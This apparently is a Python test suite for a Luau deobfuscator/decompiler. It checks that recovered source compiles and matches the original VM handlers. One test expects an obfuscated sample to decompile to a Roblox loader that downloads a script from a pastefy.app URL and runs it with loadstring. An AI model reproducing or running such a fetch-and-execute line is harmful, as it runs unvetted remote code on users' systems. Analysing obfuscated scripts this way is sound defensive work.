from moonveil.emit import emit
from moonveil.runtime import compile_source
from moonveil.vm import normalize
from harness import LuauCase
from helpers import graph, instruction, terminal

SAMPLE_RECOVERY = 'loadstring(game:HttpGet("https://pastefy.app/DBk446XH/raw"))()\n'


class IntegrationTests(LuauCase):
    def check(self, rows, params=0):
        """Every emission style must replay exactly what the original handlers do."""
        ir = normalize(graph(rows, params=params))
        expected = self.oracle(rows, params=params)
        profiles = {}
        for style in ('auto', 'structured', 'registers'):
            try:
                source, profile = emit(ir, style)
            except Exception as exc:  # structured may legitimately refuse
                self.assertEqual(style, 'structured', exc)
                continue
            profiles[style] = profile
            self.assertIs(compile_source(source, self.luau, 10), True, source)
            self.assertEqual(self.run_source(source), expected, f'{style}:\n{source}')
        return profiles

    def test_supplied_sample_compiles_and_matches_local_stub_behavior(self):
        ir = normalize(self.sample_graph)
        source, profile = emit(ir)
        self.assertEqual(profile, 'structured')
        self.assertEqual(source.splitlines()[1:], SAMPLE_RECOVERY.splitlines())
        self.assertEqual(len(ir['instructions']), 11)
        self.assertIn(b'https://pastefy.app/DBk446XH/raw', [i.get('value') for i in ir['instructions']])
        original = self.run_source(self.wrapper.source)
        for style in ('auto', 'registers'):
            candidate, _ = emit(ir, style)
            self.assertIs(compile_source(candidate, self.luau, 10), True)
            self.assertEqual(self.run_source(candidate), original)
        self.assertIn('6c6f6164737472696e67', original)  # loadstring logged
        self.assertTrue(original.endswith('1|string:72657475726e73\n'))  # zero returned values

    def test_generic_emission_against_original_handlers(self):
        cases = [
            # Fixed result count includes a nil hole; final return preserves it.
            [instruction(7, f12=37, f4=b'producer'), instruction(14, f12=60, f8=42, f9=8), instruction(7, f12=40, f4=b'sink'), terminal(a=4, return_a=1, return_b=4)],
            # Open calls and return at register zero, preserving trailing nils.
            [instruction(7, f12=37, f4=b'producer'), instruction(14, f12=60, f8=42, f9=4), instruction(7, f12=36, f4=b'sink'), terminal(a=0, b=0, c=0, return_a=0, return_b=0)],
            # Open writes leave registers above the new top unchanged.
            [instruction(1, f12=22, f4=99), instruction(7, f12=37, f4=b'short'), instruction(14, f12=60, f8=42, f9=4), instruction(7, f12=36, f4=b'sink'), terminal(a=0, b=2, return_a=3, return_b=2)],
            # SELF saves the receiver before the destination overwrites it.
            [instruction(7, f12=38, f4=b'object'), instruction(6, f12=46, f8=65, f4=b'method'), terminal(a=1, b=2, c=0, return_a=1, return_b=0)],
            # Every byte survives source emission and the VM's literal load.
            [instruction(7, f12=37, f4=b'sink'), instruction(1, f12=21, f4=bytes(range(256))), terminal(a=1, b=2, c=0, return_a=1, return_b=0)],
        ]
        for rows in cases:
            with self.subTest(rows=rows):
                self.check(rows)

    def test_stale_registers_fall_back_to_the_register_model(self):
        # The open call at register 0 leaves register 2 stale; reading it is data-dependent.
        rows = [instruction(1, f12=22, f4=99), instruction(7, f12=37, f4=b'short'), instruction(14, f12=60, f8=42, f9=4),
                instruction(7, f12=36, f4=b'sink'), terminal(a=0, b=2, return_a=3, return_b=2)]
        self.assertEqual(self.check(rows)['auto'], 'registers')

    def test_nested_calls_are_structured(self):
        # echo(echo(sink))(): the open result of the inner call feeds the outer call.
        rows = [
            instruction(7, f12=37, f4=b'echo'),                      # R1 = echo
            instruction(7, f12=38, f4=b'echo'),                      # R2 = echo
            instruction(7, f12=39, f4=b'sink'),                      # R3 = sink
            instruction(14, f12=61, f8=43, f9=4),                    # R2 = R2(R3), open
            instruction(14, f12=60, f8=41, f9=6),                    # R1 = R1(R2...), one result
            terminal(a=1, b=1, c=1, return_a=1, return_b=1),         # R1()
        ]
        profiles = self.check(rows)
        self.assertEqual(profiles['auto'], 'structured')
        source, _ = emit(normalize(graph(rows)))
        self.assertIn('echo(echo(sink))()', source)

    def test_parameter_initialization_with_missing_arguments(self):
        rows = [instruction(7, f12=36, f4=b'sink'), terminal(a=0, b=3, c=0, return_a=0, return_b=0)]
        self.check(rows, params=2)

    def test_ciphers_against_original_decoder_handlers(self):
        for kind, bias in ((4, 42), (8, 12)):
            key = b'key\x00\xff'
            plain = b'\xff\x00test123' * 35
            encoded = bytes(v ^ key[i % len(key) if kind == 4 else -1 - i % len(key)] ^ (i % 256 if kind == 4 else 0) for i, v in enumerate(plain))
            rows = [instruction(7, f12=37, f4=b'sink'), instruction(kind, f12=bias + 1, f4=key), instruction(1, f12=21, f4=encoded), terminal(a=1, b=2, c=0, return_a=1, return_b=0)]
            with self.subTest(kind=kind):
                self.check(rows)
